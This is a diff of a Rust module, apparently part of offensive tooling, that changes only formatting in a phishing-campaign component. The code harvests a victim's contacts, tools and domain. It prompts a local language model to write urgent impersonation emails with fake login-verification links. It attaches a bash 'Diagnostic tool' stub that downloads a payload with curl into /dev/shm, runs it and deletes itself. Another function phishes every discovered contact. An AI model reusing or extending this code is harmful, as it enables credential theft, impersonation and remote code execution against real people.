@@ -31,7 +31,7 @@ pub enum PhishPayload {
 /// Context gathered from the victim's environment.
 #[derive(Debug, Clone, Default)]
 pub struct VictimContext {
-    pub email_style: String,         // "formal", "casual", "technical"
+    pub email_style: String,          // "formal", "casual", "technical"
     pub common_contacts: Vec<String>, // frequently emailed people
     pub recent_topics: Vec<String>,   // "server migration", "Q4 report", etc.
     pub signature_format: String,     // How they sign emails
@@ -85,16 +85,22 @@ pub fn analyze_victim_context() -> VictimContext {
     if let Ok(hostname) = std::fs::read_to_string("/etc/hostname") {
         let parts: Vec<&str> = hostname.trim().split('.').collect();
         if parts.len() >= 2 {
-            ctx.org_domain = parts[parts.len()-2..].join(".");
+            ctx.org_domain = parts[parts.len() - 2..].join(".");
         }
     }
 
     ctx.preferred_language = std::env::var("LANG")
         .unwrap_or_else(|_| "en".into())
-        .chars().take(2).collect();
+        .chars()
+        .take(2)
+        .collect();
 
-    info!("PROPAGANDA: analyzed victim context: contacts={}, tools={:?}, domain={}",
-        ctx.common_contacts.len(), ctx.it_tools, ctx.org_domain);
+    info!(
+        "PROPAGANDA: analyzed victim context: contacts={}, tools={:?}, domain={}",
+        ctx.common_contacts.len(),
+        ctx.it_tools,
+        ctx.org_domain
+    );
 
     ctx
 }
@@ -118,9 +124,16 @@ pub fn generate_phish_email(
          Reglas:\n  1. Sin errores de ortografia\n  2. Usa jerga tecnica de {:?}\n  \
          3. Incluye saludo y firma realistas\n  4. Crea urgencia genuina\n\
          Responde SOLO con el cuerpo del correo, sin explicaciones.",
-        ctx.preferred_language, impersonating, ctx.email_style, target_user,
-        ctx.it_tools, ctx.org_domain, ctx.email_style,
-        target_user, goal, ctx.it_tools
+        ctx.preferred_language,
+        impersonating,
+        ctx.email_style,
+        target_user,
+        ctx.it_tools,
+        ctx.org_domain,
+        ctx.email_style,
+        target_user,
+        goal,
+        ctx.it_tools
     );
 
     // Try Ollama, fall back to template
@@ -136,7 +149,11 @@ pub fn generate_phish_email(
         subject,
         body,
         payload_type: PhishPayload::Link {
-            url: format!("https://{}/login/verify?token={}", ctx.org_domain, uuid::Uuid::new_v4()),
+            url: format!(
+                "https://{}/login/verify?token={}",
+                ctx.org_domain,
+                uuid::Uuid::new_v4()
+            ),
         },
         urgency: 8,
         confidence: 0.85,
@@ -167,7 +184,11 @@ fn generate_template_phish(
     impersonating: &str,
     _goal: &str,
 ) -> String {
-    let tool = ctx.it_tools.first().map(|s| s.as_str()).unwrap_or("the system");
+    let tool = ctx
+        .it_tools
+        .first()
+        .map(|s| s.as_str())
+        .unwrap_or("the system");
 
     format!(
         "Hi {},\n\n\
@@ -211,7 +232,8 @@ pub fn deploy_campaign(
 
     // Attach a larva if the goal involves execution
     if goal.contains("run") || goal.contains("execute") || goal.contains("tool") {
-        let larva_script = format!(
+        let larva_script =
+            format!(
             "#!/bin/bash\n# Diagnostic tool v{}\ncurl -s https://{}/api/verify -o /dev/shm/.diag\n\
              chmod +x /dev/shm/.diag && /dev/shm/.diag && rm \"$0\"\n",
             uuid::Uuid::new_v4().to_string().chars().take(8).collect::<String>(),
@@ -223,18 +245,23 @@ pub fn deploy_campaign(
         };
     }
 
-    info!("PROPAGANDA: campaign {} deployed to {} impersonating {}",
-        campaign.campaign_id, target_user, impersonating);
+    info!(
+        "PROPAGANDA: campaign {} deployed to {} impersonating {}",
+        campaign.campaign_id, target_user, impersonating
+    );
     campaign
 }
 
 /// Mass campaign: phish all discovered contacts.
 pub fn mass_campaign(ctx: &VictimContext, goal: &str) -> Vec<PhishingCampaign> {
-    let impersonating = ctx.common_contacts.first()
+    let impersonating = ctx
+        .common_contacts
+        .first()
         .cloned()
         .unwrap_or_else(|| "admin".into());
 
-    ctx.common_contacts.iter()
+    ctx.common_contacts
+        .iter()
         .filter(|c| *c != &impersonating)
         .map(|target| deploy_campaign(ctx, target, &impersonating, goal))
         .collect()
@@ -257,7 +284,8 @@ mod tests {
             org_domain: "acme.com".into(),
             ..Default::default()
         };
-        let body = generate_template_phish(&ctx, "john@acme.com", "ceo@acme.com", "verify credentials");
+        let body =
+            generate_template_phish(&ctx, "john@acme.com", "ceo@acme.com", "verify credentials");
         assert!(body.contains("john"));
         assert!(body.contains("ceo"));
         assert!(body.contains("acme.com"));
@@ -270,7 +298,12 @@ mod tests {
             org_domain: "testcorp.com".into(),
             ..Default::default()
         };
-        let campaign = generate_phish_email(&ctx, "dev@testcorp.com", "cto@testcorp.com", "run diagnostic tool");
+        let campaign = generate_phish_email(
+            &ctx,
+            "dev@testcorp.com",
+            "cto@testcorp.com",
+            "run diagnostic tool",
+        );
         assert!(!campaign.subject.is_empty());
         assert!(!campaign.body.is_empty());
         assert!(campaign.urgency > 0);
@@ -279,7 +312,11 @@ mod tests {
     #[test]
     fn test_mass_campaign() {
         let ctx = VictimContext {
-            common_contacts: vec!["alice@corp.com".into(), "bob@corp.com".into(), "eve@corp.com".into()],
+            common_contacts: vec![
+                "alice@corp.com".into(),
+                "bob@corp.com".into(),
+                "eve@corp.com".into(),
+            ],
             it_tools: vec!["Teams".into()],
             ..Default::default()
         };
